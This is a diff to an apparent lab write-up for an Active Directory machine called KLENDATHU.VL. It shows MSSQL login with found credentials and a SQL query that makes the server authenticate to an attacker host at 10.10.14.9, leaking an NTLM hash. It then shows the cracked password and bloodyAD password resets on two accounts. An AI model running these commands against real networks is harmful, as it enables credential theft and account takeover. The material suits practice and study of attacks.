@@ -63,7 +63,7 @@ SMB         10.13.38.36     445    SRV1             [*] Windows Server 2022 Buil
 
 
 
-## ENUM_
+## RECON
 
 ```
 └─# showmount -e 10.13.38.37                      
@@ -101,3 +101,35 @@ bloodhound-python --domain KLENDATHU.VL --domain-controller DC1.KLENDATHU.VL --n
 
 Not good report from the hound ; lets enumerate mssql if we can get some hunt to move further....
 
+```
+impacket-mssqlclient KLENDATHU.VL/zim:football22@10.13.38.36 -windows-auth
+```
+
+
+Steal NTLM HASH :: 
+
+```
+SELECT * FROM sys.dm_os_file_exists('\\10.10.14.9\re\con');
+
+We get hash on responder and cracking it ;
+
+RASCZAK :: starship99
+```
+
+
+![](klendathu_2.png)
+
+This guy got Generic Write access aka ForceChangePassword of Rico and Ibanez.
+
+```
+bloodyAD --host 10.13.38.35 -d klendathu.vl -u rasczak -p starship99 set password rico starship99             
+[+] Password changed successfully!
+
+
+bloodyAD --host 10.13.38.35 -d klendathu.vl -u rasczak -p starship99 set password ibanez starship99
+[+] Password changed successfully!
+```
+
+
+
+COERCING / NTLM RELAY [ATTACK](https://0xdeaddood.rocks/2023/02/28/relaying-everything-coercing-authentications-episode-1-mssql/) 
